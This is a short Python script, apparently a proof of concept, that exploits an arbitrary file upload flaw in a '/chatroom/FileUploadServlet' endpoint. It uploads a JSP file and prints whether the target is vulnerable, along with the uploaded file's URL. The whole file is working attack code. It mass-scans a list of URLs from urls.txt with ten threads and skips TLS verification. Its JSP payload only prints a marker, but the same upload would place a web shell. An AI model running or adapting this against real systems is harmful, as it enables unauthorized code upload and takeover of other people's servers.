import requests
import warnings
warnings.filterwarnings("ignore")
import time


def poc(url):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0',
        'Accept': '*/*',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryGIc4ig8R',
    }

    data = '\r\n------WebKitFormBoundaryGIc4ig8R\r\nContent-Disposition: form-data; name="aaa"; filename="1234.jsp"\r\n\r\n<% out.println("testqqww"); %>\r\n------WebKitFormBoundaryGIc4ig8R--\r\n'
    try:
        response = requests.post(f'{url}/chatroom/FileUploadServlet', timeout=3,headers=headers, data=data, verify=False)
        time.sleep(0.1)
    except:
         return 0
    
    if response.status_code ==200:
        print("存在漏洞",f"{url}/chatroom/uploadFile/1234.jsp")
        # input("Press Enter to continue...")
    else:
        print("不存在漏洞")
    

# with open("urls.txt", "r") as file:
#         urls = list(set(file.readlines()))
# for url in urls:
#     poc(url.strip())
from concurrent.futures import ThreadPoolExecutor
# 批量检测
with open('urls.txt', 'r') as file:
    urls = [u.strip() for u in file.readlines()][200:]
with ThreadPoolExecutor(max_workers=10) as executor:
    executor.map(poc, urls)